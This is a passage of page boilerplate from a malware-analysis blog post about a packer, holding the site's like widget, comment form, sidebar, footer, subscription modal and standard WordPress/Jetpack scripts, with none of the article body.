data-src='https://widgets.wp.com/likes/?ver=14.2-a.3#blog_id=140610880&amp;post_id=3128&amp;origin=fumik0.com&amp;obj_id=140610880-3128-676227308eb68&amp;n=1' data-name='like-post-frame-140610880-3128-676227308eb68' data-title='Like or Reblog'><h3 class="sd-title">Like this:</h3><div class='likes-widget-placeholder post-likes-widget-placeholder' style='height: 55px;'><span class='button'><span>Like</span></span> <span class="loading">Loading...</span></div><span class='sd-text-color'></span><a class='sd-link-color'></a></div>
															</div>

						</article>

						<section class="modified-date" itemprop="dateModified" content="2021-04-24T20:47:00+00:00">
							Last modified: April 24, 2021						</section>

						<section class="tags">
													</section>

																<h3 class="section-title">Author</h3>
			<aside class="author-card" itemscope itemprop="author" itemtype="http://schema.org/Person">
				<div class="author-avatar">
					<img src="https://secure.gravatar.com/avatar/60460a1a0d00b32720a59ee2624bb4aa?s=96&#038;d=identicon&#038;r=g" class="rounded-circle" itemprop="image">
				</div>
				<div class="author-info">
					<div class="author-title">
						<a href="https://fumik0.com/author/fumko/" itemprop="name">
							fumko						</a>
					</div>
					<div class="author-description" itemprop="description">  
											</div>
				</div>
			</aside>
								
													
<div id="comments" class="discussion-wrapper">
	<h3 class="section-title">Comments</h3>
	<div class="discussion-timeline">
								
		<div id="respond" class="comment-respond">
			<h3 id="reply-title" class="comment-reply-title">Leave a Reply<small><a rel="nofollow" id="cancel-comment-reply-link" href="/2021/04/24/anatomy-of-a-simple-and-popular-packer/#respond" style="display:none;">Cancel reply</a></small></h3>			<form id="commentform" class="comment-form">
				<iframe
					title="Comment Form"
					src="https://jetpack.wordpress.com/jetpack-comment/?blogid=140610880&#038;postid=3128&#038;comment_registration=0&#038;require_name_email=1&#038;stc_enabled=1&#038;stb_enabled=1&#038;show_avatars=1&#038;avatar_default=identicon&#038;greeting=Leave+a+Reply&#038;jetpack_comments_nonce=41f976a318&#038;greeting_reply=Leave+a+Reply+to+%25s&#038;color_scheme=light&#038;lang=en_US&#038;jetpack_version=14.2-a.3&#038;iframe_unique_id=1&#038;show_cookie_consent=10&#038;has_cookie_consent=0&#038;is_current_user_subscribed=0&#038;token_key=%3Bnormal%3B&#038;sig=a83eb64bbd2c79d39de2ec8d8c0d3202e2823898#parent=https%3A%2F%2Ffumik0.com%2F2021%2F04%2F24%2Fanatomy-of-a-simple-and-popular-packer%2F"
											name="jetpack_remote_comment"
						style="width:100%; height: 430px; border:0;"
										class="jetpack_remote_comment"
					id="jetpack_remote_comment"
					sandbox="allow-same-origin allow-top-navigation allow-scripts allow-forms allow-popups"
				>
									</iframe>
									<!--[if !IE]><!-->
					<script>
						document.addEventListener('DOMContentLoaded', function () {
							var commentForms = document.getElementsByClassName('jetpack_remote_comment');
							for (var i = 0; i < commentForms.length; i++) {
								commentForms[i].allowTransparency = false;
								commentForms[i].scrolling = 'no';
							}
						});
					</script>
					<!--<![endif]-->
							</form>
		</div>

		
		<input type="hidden" name="comment_parent" id="comment_parent" value="" />

			</div>
</div>

												
					
							</main>

							<aside id="aside-container" class="col-lg-4 col-md-4 col-sm-12" role="complementary">
					
	<div id="sidebar" class="sidebar">
		<section id="categories-3" class="widget widget_categories"><h2 class="widget-title">Categories</h2>
			<ul>
					<li class="cat-item cat-item-602944907"><a href="https://fumik0.com/category/botnet/">botnet</a> (2)
</li>
	<li class="cat-item cat-item-602944904"><a href="https://fumik0.com/category/projects/">Projects</a> (1)
</li>
	<li class="cat-item cat-item-602944906"><a href="https://fumik0.com/category/reverse/">Reverse</a> (7)
</li>
	<li class="cat-item cat-item-1"><a href="https://fumik0.com/category/uncategorized/">Uncategorized</a> (3)
</li>
			</ul>

			</section><section id="archives-3" class="widget widget_archive"><h2 class="widget-title">Archives</h2>
			<ul>
					<li><a href='https://fumik0.com/2021/06/'>June 2021</a></li>
	<li><a href='https://fumik0.com/2021/04/'>April 2021</a></li>
	<li><a href='https://fumik0.com/2019/12/'>December 2019</a></li>
	<li><a href='https://fumik0.com/2019/08/'>August 2019</a></li>
	<li><a href='https://fumik0.com/2019/05/'>May 2019</a></li>
	<li><a href='https://fumik0.com/2019/03/'>March 2019</a></li>
	<li><a href='https://fumik0.com/2019/02/'>February 2019</a></li>
	<li><a href='https://fumik0.com/2018/12/'>December 2018</a></li>
	<li><a href='https://fumik0.com/2018/10/'>October 2018</a></li>
	<li><a href='https://fumik0.com/2018/05/'>May 2018</a></li>
	<li><a href='https://fumik0.com/2018/01/'>January 2018</a></li>
			</ul>

			</section>	</div>

	<div id="sidebar-sticky" class="sidebar sticky-top">
		<nav id="toc" class="toc" role="navigation"></nav>
	</div>
				</aside>
			
		</div><!-- .row -->
		
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://fumik0.com/2019/12/25/lets-play-again-with-predator-the-thief/" rel="prev"><i class="fas fa-angle-left"></i> <span class="screen-reader-text">Previous Post</span> Let&#8217;s play (again) with Predator the thief</a></div><div class="nav-next"><a href="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/" rel="next"><i class="fas fa-angle-right"></i> <span class="screen-reader-text">Next Post</span> Lu0bot &#8211; An unknown NodeJS malware using UDP</a></div></div>
	</nav>	</div><!-- .container -->
</div><!-- .data-schema -->


			<footer class="footer" role="contentinfo">
								<section class="footer-sidebar">
					<div class="container px-responsive">
						<div class="row my-4">
							<section id="rss_links-5" class="widget widget_rss_links col-lg col-md-4 col-sm-12"><p><a target="_self" href="https://fumik0.com/feed/" title="Subscribe to posts"><img src="https://fumik0.com/wp-content/plugins/jetpack/images/rss/orange-small.png" alt="RSS feed" /></a></p>
</section>						</div>
					</div>
				</section>
				
				<div class="container footer-columns">
					<div class="footer-column-left">
						<div>Copyright &copy; 2024 <strong><a href="https://fumik0.com">Fumik0_&#039;s box</a></strong>. All rights reserved. Theme by <a href="https://terryl.in/" target="_blank">Mynote</a>. </div>
						<div></div>
					</div>
					<div class="footer-column-right">
						<nav class="footer-nav"><ul id="menu-social-media" class="social-icon-links"><li id="menu-item-273"><a href="http://tracker.fumik0.com"><i class="fas fa-link"></i></a></li>
<li id="menu-item-13"><a target="_blank" href="https://twitter.com/fumik0_"><span class="brand-sm"><i class="fab fa-twitter twitter brand-link"></i></span></a></li>
<li id="menu-item-424"><a href="https://github.com/Fmk0"><span class="brand-sm"><i class="fab fa-github-alt github brand-link"></i></span></a></li>
<li id="menu-item-426"><a href="https://www.youtube.com/channel/UClEmTjO2nLjbwGht-OckQhA"><span class="brand-sm"><i class="fab fa-youtube youtube brand-link"></i></span></a></li>
</ul></nav>					</div>
				</div>

			</footer>
		</div><!-- .wrapper -->
			<script>

	jQuery( document ).ready(function( $ ) {
		const win = $( window );
		const doc = $( document );
		const progressBar = $( 'progress' );
		const progressLabel = $( '.progress-label' );
		const setValue = () => win.scrollTop();
		const setMax = () => doc.height() - win.height();
		const setPercent = () => Math.round( win.scrollTop() / (doc.height() - win.height()) * 100 );
		const pageTitle = $( '#post-title' );
		const pageTitleTop = pageTitle.offset().top;
		const progressBarContainer = $( '.single-post-title-bar' );
		const headerNavBrand = $( '.header .navbar-brand' );
		const progressTitle = $( '#progress-title' );
		const headerBarContainer = $( '.header .container' );

		progressLabel.text( setPercent() + '%' );
		progressBar.attr(
			{
				value: setValue(),
				max: setMax() 
			}
		);

		doc.on( 'scroll', () => {
			progressLabel.text( setPercent() + '%' );
			progressBar.attr(
				{
					value: setValue()
				} 
			);

			if ( doc.scrollTop() > headerNavBrand.height() ) {
				//headerBarContainer.fadeOut( 800 );
				progressTitle.html( pageTitle.html() );
				progressBarContainer.find( '.navbar-brand' ).html( headerNavBrand.html() );
				progressBarContainer.fadeIn( 100 );
				progressBarContainer.addClass( 'fixed-top' );
				progressBarContainer.addClass( 'slide-down' );
			} else {
				//headerBarContainer.fadeIn( 800 );
				progressBarContainer.removeClass( 'slide-down' );
				progressBarContainer.fadeOut( 100 );

				if ( progressBarContainer.hasClass( 'fixed-top' ) ) {
					setTimeout(function() {
						progressBarContainer.removeClass( 'fixed-top' );
					}, 500);
				}
			}
		});

		win.on( 'resize', () => {
			progressLabel.text( setPercent() + '%' );
			progressBar.attr(
				{
					value: setValue(), 
					max: setMax()
				} 
			);
		});

		// Sidebar switcher
		$( '#main-container' ).attr( 'data-previous-class', $( '#main-container' ).attr( 'class' ) );

		$( '.column-control .btn-counter' ).click(function() {
			var target = $( this ).attr( 'data-target' );
			if ( $( this ).hasClass( 'active' ) ) {
				$( this ).removeClass( 'active' );

				if ( target == '#aside-container' ) {
					$( '#main-container' ).attr( 'data-previous-class', $( '#main-container' ).attr( 'class' ) );
					$( '#main-container' ).attr( 'class', 'col col-sm-12' );
					$( '#aside-container' ).hide();
				}
				if ( target == '#sidebar') {
					$( target ).show();
				}
			} else {
				$( this ).addClass( 'active' );

				if ( target == '#aside-container' ) {
					$( '#main-container' ).attr( 'class', $( '#main-container' ).attr( 'data-previous-class' ) );
					$( '#aside-container' ).show();
				}
				if ( target == '#sidebar') {
					$( target ).hide();
				}
			}

		});

		// For responsive.
		$( '.markdown-body img' ).attr('height', '');
	});

	</script>
	<script>

	jQuery( document ).ready(function( $ ) {

		$( '.scroll-area a' ).on( 'click', function(e) {
			e.preventDefault();
			var movingPosition = 0;

			if ( $( this.hash ).offset().top > $( document ).height() - $( window ).height() ) {
				movingPosition = $( document ).height() - $( window ).height();
			} else {
				movingPosition = $( this.hash ).offset().top;
			}

			$( 'html, body' ).animate({
				scrollTop: movingPosition
			}, 500, 'swing' );
		});

		$( 'a.go-top' ).on( 'click' ,function(e) {
			e.preventDefault();
			$( 'html, body' ).animate( { scrollTop: 0 }, 1000 );
		});

		$( window ).scroll( function() {      
			var windowTop =  $( window ).scrollTop();
			if ( windowTop > 100 ) {
				$( 'a.go-top' ).fadeIn( 300 );
			} else {
				$( 'a.go-top' ).fadeOut( 300 );
			}
		});

		$( '#mynote-nav-bar' ).on( 'show.bs.collapse' , function () {
			$( 'body' ).addClass( 'menu-is-collapsed' );
			$( '.main-header' ).css( { 'top': '-60px' } ).animate( { 'top': '0px' }, 500 );
			$( '.has-site-logo .search-bar' ).fadeOut( 500 );
		});

		$( '#mynote-nav-bar' ).on( 'hidden.bs.collapse' , function () {
			$( '.main-header' ).css( { 'top': '0px' } ).animate( { 'top': '-60px' }, 500 );
			$( '.has-site-logo .search-bar' ).fadeIn( 500 );
			setTimeout(function() {
				$( 'body' ).removeClass( 'menu-is-collapsed' );
			}, 500);
			
		});
	});

	</script>
	<!--  -->
<script defer id="bilmur" data-customproperties="{&quot;woo_active&quot;:&quot;0&quot;}" data-provider="wordpress.com" data-service="atomic"  src="https://s0.wp.com/wp-content/js/bilmur.min.js?m=202451"></script>
					<div class="jetpack-subscription-modal">
						<div class="jetpack-subscription-modal__modal-content">
								
	<div class="wp-block-group has-border-color jetpack-subscription-modal__modal-content-form" style="border-color:#dddddd;border-width:1px;margin-top:0;margin-bottom:0;padding:32px"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">

		
		<h2 class="wp-block-heading has-text-align-center" style="margin-top:4px;margin-bottom:10px;font-size:26px;font-style:normal;font-weight:600">Discover more from Fumik0_&#039;s box</h2>
		

		
		<p class='has-text-align-center' style='margin-top:4px;margin-bottom:0px;font-size:15px'>Subscribe now to keep reading and get access to the full archive.</p>
		

			<div class="wp-block-jetpack-subscriptions__supports-newline is-style-compact wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="140610880"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 50px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="140610880"/>
							<input type="hidden" name="source" value="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value="atomic-subscription-modal-lo"/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="c43f937e1f" /><input type="hidden" name="_wp_http_referer" value="/2021/04/24/anatomy-of-a-simple-and-popular-packer/" /><input type="hidden" name="post_id" value="3128"/>							<button type="submit"
																	class="wp-block-button__link"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 50px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	

		
		<p class="has-text-align-center jetpack-subscription-modal__close" style="margin-top:20px;font-size:14px"><a href="#">Continue reading</a></p>
		
	</div></div>
							</div>
					</div>
					<div id="jp-carousel-loading-overlay">
			<div id="jp-carousel-loading-wrapper">
				<span id="jp-carousel-library-loading">&nbsp;</span>
			</div>
		</div>
		<div class="jp-carousel-overlay" style="display: none;">

		<div class="jp-carousel-container">
			<!-- The Carousel Swiper -->
			<div
				class="jp-carousel-wrap swiper-container jp-carousel-swiper-container jp-carousel-transitions"
				itemscope
				itemtype="https://schema.org/ImageGallery">
				<div class="jp-carousel swiper-wrapper"></div>
				<div class="jp-swiper-button-prev swiper-button-prev">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskPrev" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="9" height="12">
							<path d="M16.2072 16.59L11.6496 12L16.2072 7.41L14.8041 6L8.8335 12L14.8041 18L16.2072 16.59Z" fill="white"/>
						</mask>
						<g mask="url(#maskPrev)">
							<rect x="0.579102" width="23.8823" height="24" fill="#FFFFFF"/>
						</g>
					</svg>
				</div>
				<div class="jp-swiper-button-next swiper-button-next">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskNext" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="8" height="12">
							<path d="M8.59814 16.59L13.1557 12L8.59814 7.41L10.0012 6L15.9718 12L10.0012 18L8.59814 16.59Z" fill="white"/>
						</mask>
						<g mask="url(#maskNext)">
							<rect x="0.34375" width="23.8822" height="24" fill="#FFFFFF"/>
						</g>
					</svg>
				</div>
			</div>
			<!-- The main close buton -->
			<div class="jp-carousel-close-hint">
				<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
					<mask id="maskClose" mask-type="alpha" maskUnits="userSpaceOnUse" x="5" y="5" width="15" height="14">
						<path d="M19.3166 6.41L17.9135 5L12.3509 10.59L6.78834 5L5.38525 6.41L10.9478 12L5.38525 17.59L6.78834 19L12.3509 13.41L17.9135 19L19.3166 17.59L13.754 12L19.3166 6.41Z" fill="white"/>
					</mask>
					<g mask="url(#maskClose)">
						<rect x="0.409668" width="23.8823" height="24" fill="#FFFFFF"/>
					</g>
				</svg>
			</div>
			<!-- Image info, comments and meta -->
			<div class="jp-carousel-info">
				<div class="jp-carousel-info-footer">
					<div class="jp-carousel-pagination-container">
						<div class="jp-swiper-pagination swiper-pagination"></div>
						<div class="jp-carousel-pagination"></div>
					</div>
					<div class="jp-carousel-photo-title-container">
						<h2 class="jp-carousel-photo-caption"></h2>
					</div>
					<div class="jp-carousel-photo-icons-container">
						<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-info" aria-label="Toggle photo metadata visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskInfo" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M12.7537 2C7.26076 2 2.80273 6.48 2.80273 12C2.80273 17.52 7.26076 22 12.7537 22C18.2466 22 22.7046 17.52 22.7046 12C22.7046 6.48 18.2466 2 12.7537 2ZM11.7586 7V9H13.7488V7H11.7586ZM11.7586 11V17H13.7488V11H11.7586ZM4.79292 12C4.79292 16.41 8.36531 20 12.7537 20C17.142 20 20.7144 16.41 20.7144 12C20.7144 7.59 17.142 4 12.7537 4C8.36531 4 4.79292 7.59 4.79292 12Z" fill="white"/>
									</mask>
									<g mask="url(#maskInfo)">
										<rect x="0.8125" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>
							</span>
						</a>
												<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-comments" aria-label="Toggle photo comments visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskComments" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M4.3271 2H20.2486C21.3432 2 22.2388 2.9 22.2388 4V16C22.2388 17.1 21.3432 18 20.2486 18H6.31729L2.33691 22V4C2.33691 2.9 3.2325 2 4.3271 2ZM6.31729 16H20.2486V4H4.3271V18L6.31729 16Z" fill="white"/>
									</mask>
									<g mask="url(#maskComments)">
										<rect x="0.34668" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>

								<span class="jp-carousel-has-comments-indicator" aria-label="This image has comments."></span>
							</span>
						</a>
											</div>
				</div>
				<div class="jp-carousel-info-extra">
					<div class="jp-carousel-info-content-wrapper">
						<div class="jp-carousel-photo-title-container">
							<h2 class="jp-carousel-photo-title"></h2>
						</div>
						<div class="jp-carousel-comments-wrapper">
															<div id="jp-carousel-comments-loading">
									<span>Loading Comments...</span>
								</div>
								<div class="jp-carousel-comments"></div>
								<div id="jp-carousel-comment-form-container">
									<span id="jp-carousel-comment-form-spinner">&nbsp;</span>
									<div id="jp-carousel-comment-post-results"></div>
																														<form id="jp-carousel-comment-form">
												<label for="jp-carousel-comment-form-comment-field" class="screen-reader-text">Write a Comment...</label>
												<textarea
													name="comment"
													class="jp-carousel-comment-form-field jp-carousel-comment-form-textarea"
													id="jp-carousel-comment-form-comment-field"
													placeholder="Write a Comment..."
												></textarea>
												<div id="jp-carousel-comment-form-submit-and-info-wrapper">
													<div id="jp-carousel-comment-form-commenting-as">
																													<fieldset>
																<label for="jp-carousel-comment-form-email-field">Email (Required)</label>
																<input type="text" name="email" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-email-field" />
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-author-field">Name (Required)</label>
																<input type="text" name="author" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-author-field" />
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-url-field">Website</label>
																<input type="text" name="url" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-url-field" />
															</fieldset>
																											</div>
													<input
														type="submit"
														name="submit"
														class="jp-carousel-comment-form-button"
														id="jp-carousel-comment-form-button-submit"
														value="Post Comment" />
												</div>
											</form>
																											</div>
													</div>
						<div class="jp-carousel-image-meta">
							<div class="jp-carousel-title-and-caption">
								<div class="jp-carousel-photo-info">
									<h3 class="jp-carousel-caption" itemprop="caption description"></h3>
								</div>

								<div class="jp-carousel-photo-description"></div>
							</div>
							<ul class="jp-carousel-image-exif" style="display: none;"></ul>
							<a class="jp-carousel-image-download" href="#" target="_blank" style="display: none;">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="mask0" mask-type="alpha" maskUnits="userSpaceOnUse" x="3" y="3" width="19" height="18">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M5.84615 5V19H19.7775V12H21.7677V19C21.7677 20.1 20.8721 21 19.7775 21H5.84615C4.74159 21 3.85596 20.1 3.85596 19V5C3.85596 3.9 4.74159 3 5.84615 3H12.8118V5H5.84615ZM14.802 5V3H21.7677V10H19.7775V6.41L9.99569 16.24L8.59261 14.83L18.3744 5H14.802Z" fill="white"/>
									</mask>
									<g mask="url(#mask0)">
										<rect x="0.870605" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>
								<span class="jp-carousel-download-text"></span>
							</a>
							<div class="jp-carousel-image-map" style="display: none;"></div>
						</div>
					</div>
				</div>
			</div>
		</div>

		</div>
		
	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/fumik0.com\/2021\/04\/24\/anatomy-of-a-simple-and-popular-packer\/":3128};
	</script>
				<link rel='stylesheet' id='jetpack-carousel-swiper-css-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/carousel/swiper-bundle.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-carousel-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/carousel/jetpack-carousel.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-block-subscriptions-css' href='https://fumik0.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.css?minify=false&#038;ver=14.2-a.3' type='text/css' media='all' />
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/comment-reply.min.js" id="comment-reply-js" async="async" data-wp-strategy="async"></script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="text/javascript" id="subscription-modal-js-js-extra">
/* <![CDATA[ */
var subscriptionData = {"homeUrl":"fumik0.com"};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/modules/comments/subscription-modal-on-comment/subscription-modal.js?ver=14.2-a.3" id="subscription-modal-js-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/build/likes/queuehandler.min.js?ver=14.2-a.3" id="jetpack_likes_queuehandler-js"></script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/clipboard.min.js" id="clipboard-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/highlighting-code-block/assets/js/prism.js?ver=1.2.9" id="hcb-prism-js"></script>
<script type="text/javascript" id="hcb-script-js-extra">
/* <![CDATA[ */
var hcbVars = {"showCopy":"on"};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/highlighting-code-block/build/js/hcb_script.js?ver=1.2.9" id="hcb-script-js"></script>
<script type="text/javascript" src="https://stats.wp.com/e-202451.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"140610880\",\"post\":\"3128\",\"tz\":\"0\",\"srv\":\"fumik0.com\",\"hp\":\"atomic\",\"ac\":\"2\",\"amp\":\"0\",\"j\":\"1:14.2-a.3\"}") ]);
_stq.push([ "clickTrackerInit", "140610880", "3128" ]);
/* ]]> */
</script>
<script type="text/javascript" id="jetpack-carousel-js-extra">
/* <![CDATA[ */
var jetpackSwiperLibraryPath = {"url":"https:\/\/fumik0.com\/wp-content\/plugins\/jetpack\/_inc\/build\/carousel\/swiper-bundle.min.js"};
var jetpackCarouselStrings = {"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"en","ajaxurl":"https:\/\/fumik0.com\/wp-admin\/admin-ajax.php","nonce":"acafc58171","display_exif":"1","display_comments":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"black","comment":"Comment","post_comment":"Post Comment","write_comment":"Write a Comment...","loading_comments":"Loading Comments...","image_label":"Open image in full-screen.","download_original":"View full size <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Please be sure to submit some text with your comment.","no_comment_email":"Please provide an email address to comment.","no_comment_author":"Please provide your name to comment.","comment_post_error":"Sorry, but there was an error posting your comment. Please try again later.","comment_approved":"Your comment was approved.","comment_unapproved":"Your comment is in moderation.","camera":"Camera","aperture":"Aperture","shutter_speed":"Shutter Speed","focal_length":"Focal Length","copyright":"Copyright","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/fumik0.com\/wp-login.php?redirect_to=https%3A%2F%2Ffumik0.com%2F2021%2F04%2F24%2Fanatomy-of-a-simple-and-popular-packer%2F","blog_id":"1","meta_data":["camera","aperture","shutter_speed","focal_length","copyright"]};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/build/carousel/jetpack-carousel.min.js?ver=14.2-a.3" id="jetpack-carousel-js"></script>
<script defer type="text/javascript" src="https://fumik0.com/wp-content/plugins/akismet/_inc/akismet-frontend.js?ver=1704837122" id="akismet-frontend-js"></script>
<script type="text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://fumik0.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=14.2-a.3" id="jetpack-block-subscriptions-js"></script>
<script type="text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js?ver=14.2-a.3" id="sharing-js-js"></script>
<script type="text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>
	<iframe src='https://widgets.wp.com/likes/master.html?ver=20241218#ver=20241218&#038;n=1' scrolling='no' id='likes-master' name='likes-master' style='display:none;'></iframe>
	<div id='likes-other-gravatars' class='wpl-new-layout' role="dialog" aria-hidden="true" tabindex="-1"><div class="likes-text"><span>%d</span></div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
			<script type="text/javascript">
			(function () {
				const iframe = document.getElementById( 'jetpack_remote_comment' );
								const watchReply = function() {
					// Check addComment._Jetpack_moveForm to make sure we don't monkey-patch twice.
					if ( 'undefined' !== typeof addComment && ! addComment._Jetpack_moveForm ) {
						// Cache the Core function.
						addComment._Jetpack_moveForm = addComment.moveForm;
						const commentParent = document.getElementById( 'comment_parent' );
						const cancel = document.getElementById( 'cancel-comment-reply-link' );

						function tellFrameNewParent ( commentParentValue ) {
							const url = new URL( iframe.src );
							if ( commentParentValue ) {
								url.searchParams.set( 'replytocom', commentParentValue )
							} else {
								url.searchParams.delete( 'replytocom' );
							}
							if( iframe.src !== url.href ) {
								iframe.src = url.href;
							}
						};

						cancel.addEventListener( 'click', function () {
							tellFrameNewParent( false );
						} );

						addComment.moveForm = function ( _, parentId ) {
							tellFrameNewParent( parentId );
							return addComment._Jetpack_moveForm.apply( null, arguments );
						};
					}
				}
				document.addEventListener( 'DOMContentLoaded', watchReply );
				// In WP 6.4+, the script is loaded asynchronously, so we need to wait for it to load before we monkey-patch the functions it introduces.
				document.querySelector('#comment-reply-js')?.addEventListener( 'load', watchReply );

								
				const commentIframes = document.getElementsByClassName('jetpack_remote_comment');

				window.addEventListener('message', function(event) {
					if (event.origin !== 'https://jetpack.wordpress.com') {
						return;
					}

					if (!event?.data?.iframeUniqueId && !event?.data?.height) {
						return;
					}

					const eventDataUniqueId = event.data.iframeUniqueId;

					// Change height for the matching comment iframe
					for (let i = 0; i < commentIframes.length; i++) {
						const iframe = commentIframes[i];
						const url = new URL(iframe.src);
						const iframeUniqueIdParam = url.searchParams.get('iframe_unique_id');
